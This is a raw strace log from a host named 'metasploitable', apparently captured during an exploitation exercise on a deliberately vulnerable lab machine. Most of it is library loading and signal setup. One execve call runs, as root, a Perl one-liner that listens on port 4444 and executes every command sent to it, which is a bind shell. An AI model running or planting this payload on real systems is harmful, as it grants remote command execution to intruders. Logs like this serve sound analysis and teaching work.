12316 07:41:50.019535 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
12316 07:41:50.019553 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd3000
12316 07:41:50.019565 mmap2(0xb7ddb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7ddb000
12316 07:41:50.019581 close(1)          = 0
12316 07:41:50.019594 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12316 07:41:50.019607 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
12316 07:41:50.019622 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12316 07:41:50.019711 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12316 07:41:50.019728 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc8000
12316 07:41:50.019740 mmap2(0xb7dd1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dd1000
12316 07:41:50.019756 close(1)          = 0
12316 07:41:50.019777 munmap(0xb7f83000, 29913) = 0
12316 07:41:50.019793 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
12316 07:41:50.019807 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12316 07:41:50.019819 _llseek(1, 0, [0], SEEK_CUR) = 0
12316 07:41:50.019831 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
12316 07:41:50.019890 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f8a000
12316 07:41:50.019901 _llseek(1, 1624, [1624], SEEK_SET) = 0
12316 07:41:50.019917 munmap(0xb7f8a000, 1624) = 0
12316 07:41:50.019927 close(1)          = 0
12316 07:41:50.019955 getpgrp()         = 3831
12316 07:41:50.019966 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
12316 07:41:50.019981 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
12316 07:41:50.019997 brk(0x8101000)    = 0x8101000
12316 07:41:50.020028 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12316 07:41:50.020043 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12316 07:41:50.020061 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12316 07:41:50.020099 brk(0x8102000)    = 0x8102000
12316 07:41:50.020125 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12316 07:41:50.020145 stat64("/sbin/AB", 0xbfc23278) = -1 ENOENT (No such file or directory)
12316 07:41:50.020157 stat64("/bin/AB", 0xbfc23278) = -1 ENOENT (No such file or directory)
12316 07:41:50.020169 stat64("/usr/sbin/AB", 0xbfc23278) = -1 ENOENT (No such file or directory)
12316 07:41:50.020181 stat64("/usr/bin/AB", 0xbfc23278) = -1 ENOENT (No such file or directory)
12316 07:41:50.020194 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12316 07:41:50.020209 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dfe6f8) = 12317
12317 07:41:50.020256 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12317 07:41:50.020272 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12317 07:41:50.020285 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12317 07:41:50.020298 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12317 07:41:50.020313 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12317 07:41:50.020329 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12317 07:41:50.020391 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12317 07:41:50.020449 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
12317 07:41:50.020463 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12317 07:41:50.020532 exit_group(127)   = ?
12316 07:41:50.045856 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12316 07:41:50.045856 --- SIGCHLD (Child exited) @ 0 (0) ---
12316 07:41:50.045856 waitpid(-1,  <unfinished ...>
4519  07:41:50.045856 waitpid(12316,  <unfinished ...>
12316 07:41:50.045856 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 12317
12316 07:41:50.065843 waitpid(-1, 0xbfc22ef8, WNOHANG) = -1 ECHILD (No child processes)
12316 07:41:50.065843 sigreturn()       = ? (mask now [])
12316 07:41:50.065843 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12316 07:41:50.065843 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12316 07:41:50.065844 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12316 07:41:50.065844 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12316 07:41:50.065844 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12316 07:41:50.065844 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12316 07:41:50.065845 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12316 07:41:50.065845 stat64("/sbin/perl", 0xbfc232a8) = -1 ENOENT (No such file or directory)
12316 07:41:50.065845 stat64("/bin/perl", 0xbfc232a8) = -1 ENOENT (No such file or directory)
12316 07:41:50.065845 stat64("/usr/sbin/perl", 0xbfc232a8) = -1 ENOENT (No such file or directory)
12316 07:41:50.065845 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12316 07:41:50.065850 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12316 07:41:50.065877 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12316 07:41:50.065892 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dfe6f8) = 12318
12318 07:41:50.065944 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12318 07:41:50.065961 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12318 07:41:50.065975 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12318 07:41:50.066001 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12318 07:41:50.066045 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12318 07:41:50.066078 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12318 07:41:50.066091 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12318 07:41:50.066127 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12318 07:41:50.066217 brk(0)            = 0x8153000
12318 07:41:50.066239 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.066260 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f43000
12318 07:41:50.066276 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.066293 open("/etc/ld.so.cache", O_RDONLY) = 1
12318 07:41:50.066306 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12318 07:41:50.066323 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f3b000
12318 07:41:50.066334 close(1)          = 0
12318 07:41:50.066344 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.066360 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12318 07:41:50.066374 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12318 07:41:50.066466 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12318 07:41:50.066495 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f37000
12318 07:41:50.066509 mmap2(0xb7f39000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f39000
12318 07:41:50.066526 close(1)          = 0
12318 07:41:50.066538 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.066552 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12318 07:41:50.066566 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12318 07:41:50.066655 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12318 07:41:50.066672 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f12000
12318 07:41:50.066683 mmap2(0xb7f35000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f35000
12318 07:41:50.066699 close(1)          = 0
12318 07:41:50.066711 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.066725 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12318 07:41:50.066739 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12318 07:41:50.066829 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12318 07:41:50.066846 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f11000
12318 07:41:50.066859 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ef9000
12318 07:41:50.066870 mmap2(0xb7f0d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f0d000
12318 07:41:50.066885 mmap2(0xb7f0f000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f0f000
12318 07:41:50.066899 close(1)          = 0
12318 07:41:50.066911 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.066924 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12318 07:41:50.066938 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12318 07:41:50.067034 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12318 07:41:50.067053 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7daa000
12318 07:41:50.067066 mmap2(0xb7ef3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ef3000
12318 07:41:50.067081 mmap2(0xb7ef6000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000
12318 07:41:50.067095 close(1)          = 0
12318 07:41:50.067107 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12318 07:41:50.067121 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12318 07:41:50.067135 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12318 07:41:50.067228 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12318 07:41:50.067245 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d78000
12318 07:41:50.067256 mmap2(0xb7d81000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d81000
12318 07:41:50.067271 mmap2(0xb7d83000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d83000
12318 07:41:50.067285 close(1)          = 0
12318 07:41:50.067308 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d77000
12318 07:41:50.067321 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d778c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12318 07:41:50.067381 mprotect(0xb7ef3000, 4096, PROT_READ) = 0
12318 07:41:50.067408 munmap(0xb7f3b000, 29913) = 0
12318 07:41:50.067421 set_tid_address(0xb7d77908) = 12318
12318 07:41:50.067430 set_robust_list(0xb7d77910, 0xc) = 0
12318 07:41:50.067440 futex(0xbff55bf0, 0x81 /* FUTEX_??? */, 1) = 0
12318 07:41:50.067454 rt_sigaction(SIGRTMIN, {0xb7efd2c0, [], SA_SIGINFO}, NULL, 8) = 0
12318 07:41:50.067467 rt_sigaction(SIGRT_1, {0xb7efd340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12318 07:41:50.067487 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12318 07:41:50.067503 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12318 07:41:50.067523 uname({sys="Linux", node="metasploitable", ...}) = 0
12318 07:41:50.067570 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12318 07:41:50.067616 brk(0)            = 0x8153000
12318 07:41:50.067625 brk(0x8174000)    = 0x8174000
12318 07:41:50.067669 getuid32()        = 0
12318 07:41:50.067679 geteuid32()       = 0
12318 07:41:50.067689 getgid32()        = 0
12318 07:41:50.067698 getegid32()       = 0
12318 07:41:50.067735 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d56000
12318 07:41:50.067762 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12318 07:41:50.067779 read(1, "\7)\215\223", 4) = 4
12318 07:41:50.067796 close(1)          = 0
12318 07:41:50.067814 time(NULL)        = 1495626110
12318 07:41:50.067857 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbff558c0) = -1 ENOENT (No such file or directory)
12318 07:41:50.067874 stat64("/usr/local/lib/site_perl/5.8.8", 0xbff558c0) = -1 ENOENT (No such file or directory)
12318 07:41:50.067888 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbff558c0) = -1 ENOENT (No such file or directory)
12318 07:41:50.067903 stat64("/usr/local/lib/perl/5.8.7", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.067916 stat64("/usr/local/share/perl/5.8.7", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.067929 stat64("/usr/local/lib/perl/5.8.6", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.067941 stat64("/usr/local/share/perl/5.8.6", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.067953 stat64("/usr/local/lib/perl/5.8.4", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.067964 stat64("/usr/local/share/perl/5.8.4", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.067984 stat64("/usr/local/lib/perl/5.8.3", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068026 stat64("/usr/local/share/perl/5.8.3", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068056 stat64("/usr/local/lib/perl/5.8.2", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068068 stat64("/usr/local/share/perl/5.8.2", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068080 stat64("/usr/local/lib/perl/5.8.1", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068092 stat64("/usr/local/share/perl/5.8.1", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068104 stat64("/usr/local/lib/perl/5.8.0", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068116 stat64("/usr/local/share/perl/5.8.0", 0xbff55a00) = -1 ENOENT (No such file or directory)
12318 07:41:50.068139 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff556f8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.068153 _llseek(0, 0, [0], SEEK_CUR) = 0
12318 07:41:50.068166 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff556f8) = -1 EBADF (Bad file descriptor)
12318 07:41:50.068176 _llseek(1, 0, 0xbff55740, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12318 07:41:50.068187 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff556f8) = -1 EINVAL (Invalid argument)
12318 07:41:50.068198 _llseek(2, 0, 0xbff55740, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12318 07:41:50.068208 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12318 07:41:50.068221 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff557b8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.068231 _llseek(1, 0, [0], SEEK_CUR) = 0
12318 07:41:50.068242 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12318 07:41:50.068254 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12318 07:41:50.068273 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
